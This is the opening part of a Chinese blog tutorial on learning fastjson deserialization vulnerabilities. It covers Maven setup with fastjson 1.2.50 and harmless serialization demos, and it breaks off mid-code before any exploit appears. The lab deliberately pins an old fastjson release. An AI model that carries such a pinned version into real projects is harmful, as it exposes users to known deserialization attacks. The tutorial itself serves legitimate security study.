content="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680777390863-4080f6fa-2c82-4f4d-abf6-5262756df1bb.png#averageHue=%23f9f8f7&amp;clientId=u8272b843-0f56-4&amp;from=paste&amp;height=818&amp;id=u9caf80c7&amp;name=image.png&amp;originHeight=1022&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=213569&amp;status=done&amp;style=none&amp;taskId=uf347b2b9-9fdf-4fd7-8104-d2bfe099d43&amp;title=&amp;width=1536"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680778956318-ac9ae2f8-b2c7-4ce1-9765-f13a975ec8ba.png#averageHue=%23f9f8f7&amp;clientId=u8272b843-0f56-4&amp;from=paste&amp;height=817&amp;id=u0ebc4421&amp;name=image.png&amp;originHeight=1021&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=207624&amp;status=done&amp;style=none&amp;taskId=u51ffae09-4478-4349-9cfa-30dea94e458&amp;title=&amp;width=1536"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779902751-3dbcc23e-48e6-44be-b9cf-b2dc06fe1aa0.png#averageHue=%23f7efe9&amp;clientId=u8272b843-0f56-4&amp;from=paste&amp;height=510&amp;id=ue9a11536&amp;name=image.png&amp;originHeight=637&amp;originWidth=729&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=52288&amp;status=done&amp;style=none&amp;taskId=ub780def9-05b0-4ad6-b030-65effb37901&amp;title=&amp;width=583.2"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779685303-8744e9a5-f783-41c1-8c82-25f52f511814.png#averageHue=%23f9f6f5&amp;clientId=u8272b843-0f56-4&amp;from=paste&amp;height=816&amp;id=u2ad5c90a&amp;name=image.png&amp;originHeight=1020&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=236850&amp;status=done&amp;style=none&amp;taskId=u1f53ea35-31b4-46a9-a19b-963e88f00c4&amp;title=&amp;width=1536"><meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680779966075-84e49d32-ad2c-40fa-9567-a080307c37c9.png#averageHue=%23f9f8f7&amp;clientId=u8272b843-0f56-4&amp;from=paste&amp;height=817&amp;id=ued608110&amp;name=image.png&amp;originHeight=1021&amp;originWidth=1920&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=224876&amp;status=done&amp;style=none&amp;taskId=uff4d739d-577e-4572-805d-944bb078745&amp;title=&amp;width=1536"><meta property="article:published_time" content="2024-12-30T06:04:53.000Z"><meta property="article:modified_time" content="2024-12-30T07:04:32.367Z"><meta property="article:author" content="W01fh4cker"><meta property="article:tag" content="Java"><meta property="article:tag" content="Fastjson"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810150808-505a54f9-7b81-4e4f-9633-fd72986c7a23.png#averageHue=%233f4956&amp;clientId=u5a3e9323-ecb0-4&amp;from=paste&amp;height=134&amp;id=uae782e2e&amp;name=image.png&amp;originHeight=167&amp;originWidth=715&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=17956&amp;status=done&amp;style=none&amp;taskId=ud8efe4aa-6e39-4404-8036-eae240fa0f3&amp;title=&amp;width=572"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://w01fh4cker.github.io/2024/12/30/LearnFastjsonVulnFromZero-Basic/"},"headline":"零基础学fastjson漏洞（基础篇）","image":[],"datePublished":"2024-12-30T06:04:53.000Z","dateModified":"2024-12-30T07:04:32.367Z","author":{"@type":"Person","name":"W01fh4cker"},"publisher":{"@type":"Organization","name":"W01fh4cker's blog","logo":{"@type":"ImageObject","url":"https://w01fh4cker.github.io/img/avatar.jpg"}},"description":"​    我在学习Java漏洞的时候，感觉很痛苦，不知道从何学起，因为我的Java基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问chatgpt以及问Java安全大牛师傅们，于是就有了这一系列的文章。​    本文作为Jav"}</script><link rel="canonical" href="https://w01fh4cker.github.io/2024/12/30/LearnFastjsonVulnFromZero-Basic/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="W01fh4cker's blog" type="application/atom+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/avatar.jpg" alt="W01fh4cker&#039;s blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/W01fh4cker"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2024-12-30T06:04:53.000Z" title="2024/12/30 14:04:53">2024-12-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2024-12-30T07:04:32.367Z" title="2024/12/30 15:04:32">2024-12-30</time></span><span class="level-item"> W01fh4cker </span><span class="level-item">2 hours read (About 18823 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">零基础学fastjson漏洞（基础篇）</h1><div class="content"><p>​    我在学习<code>Java</code>漏洞的时候，感觉很痛苦，不知道从何学起，因为我的<code>Java</code>基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问<code>chatgpt</code>以及问<code>Java</code>安全大牛师傅们，于是就有了这一系列的文章。<br>​    本文作为<code>Java</code>安全亲妈级零基础教程的第一篇<code>Fastjson</code>漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文除去代码一共近<code>11000</code>字，配图<code>108</code>张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究<code>Fastjson</code>的其他<code>payload</code>和<code>Fastjson</code>的不出网利用上，会在下一次更新。<br>​    我在学习<code>Fastjson</code>相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不觉。在写这系列的文章的时候，我常常能进入到久违的”心流“状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！<br>​    在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。<br>​    本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！  </p>
<span id="more"></span>

<h1 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h1><h2 id="1-fastjson怎么用？"><a href="#1-fastjson怎么用？" class="headerlink" title="1. fastjson怎么用？"></a>1. fastjson怎么用？</h2><p><code>fastjson</code>是啥百度就有，看了之后不熟悉的人还是会一脸懵逼，我们可以通过以下这个小例子来快速学会使用<code>fastjson</code>。我们分为以下几个步骤来进行：</p>
<h3 id="（1）在IDEA中新建一个maven项目，并引入fastjson依赖"><a href="#（1）在IDEA中新建一个maven项目，并引入fastjson依赖" class="headerlink" title="（1）在IDEA中新建一个maven项目，并引入fastjson依赖"></a>（1）在IDEA中新建一个maven项目，并引入fastjson依赖</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810150808-505a54f9-7b81-4e4f-9633-fd72986c7a23.png#averageHue=%233f4956&clientId=u5a3e9323-ecb0-4&from=paste&height=134&id=uae782e2e&name=image.png&originHeight=167&originWidth=715&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17956&status=done&style=none&taskId=ud8efe4aa-6e39-4404-8036-eae240fa0f3&title=&width=572" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810171469-292f969d-495e-41a9-b3a0-4ac11ff8b11f.png#averageHue=%233d4144&clientId=u5a3e9323-ecb0-4&from=paste&height=616&id=ud692157b&name=image.png&originHeight=770&originWidth=1000&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60694&status=done&style=none&taskId=ucd608cff-9d5f-44fc-b9b8-b0f63eb6458&title=&width=800" alt="image.png"><br>选择<code>Maven</code>，然后给随便取个名字，例如我起名<code>fastjson_research</code>。<br>然后在pom.xml这里的末尾，添加如下内容：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.50</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810256002-2cb3c874-f77d-44a9-b839-b16988e377d2.png#averageHue=%237b7752&clientId=u5a3e9323-ecb0-4&from=paste&height=674&id=u151de80a&name=image.png&originHeight=843&originWidth=1727&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140235&status=done&style=none&taskId=u3b3be4c0-bfcc-4c3c-a25d-a10a46cfc22&title=&width=1381.6" alt="image.png"><br>具体<code>Maven</code>的各个依赖的详细信息我们可以在这个网站上面查得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.50</span><br></pre></td></tr></table></figure>
<p>然后点击右侧的<code>Maven</code>，然后点击<code>Reload All Maven Projects</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678810581918-9de49706-1559-4e51-9215-eb23ef031648.png#averageHue=%2353705c&clientId=u5a3e9323-ecb0-4&from=paste&height=815&id=u0144c4c9&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=156019&status=done&style=none&taskId=u98e35746-75e0-4867-b5fb-47a0cea9080&title=&width=1536" alt="image.png"></p>
<h3 id="（2）一个简单的demo"><a href="#（2）一个简单的demo" class="headerlink" title="（2）一个简单的demo"></a>（2）一个简单的demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 将一个 Java 对象序列化为 JSON 字符串</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将一个 JSON 字符串反序列化为 Java 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + <span class="string">&quot;, &quot;</span> + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个简单的 Java 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行之后输出结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678850073066-4c9b9608-3eba-47d8-acdf-10d415adb5ff.png#averageHue=%23706d58&clientId=u5a3e9323-ecb0-4&from=paste&height=771&id=u744eef74&name=image.png&originHeight=964&originWidth=1406&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=138066&status=done&style=none&taskId=u47b99af9-a647-40f2-a2cd-181095a4ff2&title=&width=1124.8" alt="image.png"><br>通过以上代码我们可以看到，我们定义了一个<code>Person</code>类，并设置了两个属性<code>age</code>以及<code>name</code>，以及简单定义了四个方法。<br>我们通过<code>Person person = new Person(&quot;Alice&quot;, 18);</code>来初始化对象，再通过<code>String jsonString = JSON.toJSONString(person);</code>去把对象转化为<code>json</code>字符串，非常方便快捷；完事之后，我们又可以通过<code>Person person2 = JSON.parseObject(jsonString2, Person.class);</code>把<code>json</code>字符串转换为<code>Java</code>对象，非常简单快捷。</p>
<h3 id="（3）更进一步改动理解上述demo代码"><a href="#（3）更进一步改动理解上述demo代码" class="headerlink" title="（3）更进一步改动理解上述demo代码"></a>（3）更进一步改动理解上述demo代码</h3><p>其实上面给出的代码是有一些问题的，这个问题并不是指代码本身错误。</p>
<h4 id="①问题1：Person-person2-JSON-parseObject-jsonString2-Person-class-这里为什么可以直接使用Person-class来进行映射？"><a href="#①问题1：Person-person2-JSON-parseObject-jsonString2-Person-class-这里为什么可以直接使用Person-class来进行映射？" class="headerlink" title="①问题1：Person person2 = JSON.parseObject(jsonString2, Person.class);这里为什么可以直接使用Person.class来进行映射？"></a>①问题1：<code>Person person2 = JSON.parseObject(jsonString2, Person.class);</code>这里为什么可以直接使用<code>Person.class</code>来进行映射？</h4><p>在使用<code>fastjson</code>时，我们需要先将<code>JSON</code>字符串和<code>Java</code>对象之间建立映射关系，可以通过类的属性和<code>JSON</code>字段名进行映射。在我们上面的代码中，<code>Java</code>类的属性名和<code>JSON</code>字段名是相同的，因此可以直接使用<code>Person.class</code>来进行映射。<br><strong>如果不同我们该怎么办？</strong><br>我们可以通过使用注解来指定它们之间的映射关系。在<code>fastjson</code>中，可以使用<code>@JSONField</code>注解来指定<code>Java</code>类的属性和<code>JSON</code>字段之间的映射关系。请看以下<code>demo</code>代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 将一个 Java 对象序列化为 JSON 字符串</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将一个 JSON 字符串反序列化为 Java 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;user_name\&quot;:\&quot;Bob\&quot;,\&quot;user_age\&quot;:20&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + <span class="string">&quot;, &quot;</span> + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个简单的 Java 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="meta">@JSONField(name = &quot;user_name&quot;)</span></span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="meta">@JSONField(name = &quot;user_age&quot;)</span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1678850867581-374608ce-3e06-4a4e-a605-07877bc810af.png#averageHue=%23757258&clientId=u5a3e9323-ecb0-4&from=paste&height=818&id=ua4f98178&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=183193&status=done&style=none&taskId=u146cb755-819c-468f-b3d3-20025bb1e31&title=&width=1536" alt="image.png"><br>可以看到，我们在定义<code>name</code>和<code>age</code>的时候，在上面分别加入了一行<code>@JSONField(name = &quot;user_name&quot;)</code>和<code>@JSONField(name = &quot;user_age&quot;)</code>，这样一来，即使我们输入的字符串中写的是<code>user_name</code>和<code>user_age</code>，它也能被识别解析到。</p>
<h4 id="②问题2：为什么我初始化对象的时候，代码明明写的是Person-person-new-Person-Alice-18-，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？"><a href="#②问题2：为什么我初始化对象的时候，代码明明写的是Person-person-new-Person-Alice-18-，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？" class="headerlink" title="②问题2：为什么我初始化对象的时候，代码明明写的是Person person = new Person(&quot;Alice&quot;, 18);，name在前，age在后，怎么转化成json字符串的时候就变成了age在前，name在后了？"></a>②问题2：为什么我初始化对象的时候，代码明明写的是<code>Person person = new Person(&quot;Alice&quot;, 18);</code>，<code>name</code>在前，<code>age</code>在后，怎么转化成<code>json</code>字符串的时候就变成了<code>age</code>在前，<code>name</code>在后了？</h4><p>原来，在<code>fastjson</code>中，默认情况下，生成的<code>JSON</code>字符串的顺序是按照<strong>属性的字母顺序</strong>进行排序的，而不是按照属性在类中的声明顺序。<br>如果我们希望按照属性在类中的声明顺序来生成<code>JSON</code>字符串，可以通过在类中使用<code>@JSONType</code>注解来设置属性的序列化顺序，请看下面的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 将一个 Java 对象序列化为 JSON 字符串</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将一个 JSON 字符串反序列化为 Java 对象</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;Bob\&quot;,\&quot;age\&quot;:20&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> JSON.parseObject(jsonString2, Person.class);</span><br><span class="line">        System.out.println(person2.getName() + <span class="string">&quot;, &quot;</span> + person2.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个简单的 Java 类</span></span><br><span class="line">    <span class="meta">@JSONType(orders = &#123;&quot;name&quot;, &quot;age&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span 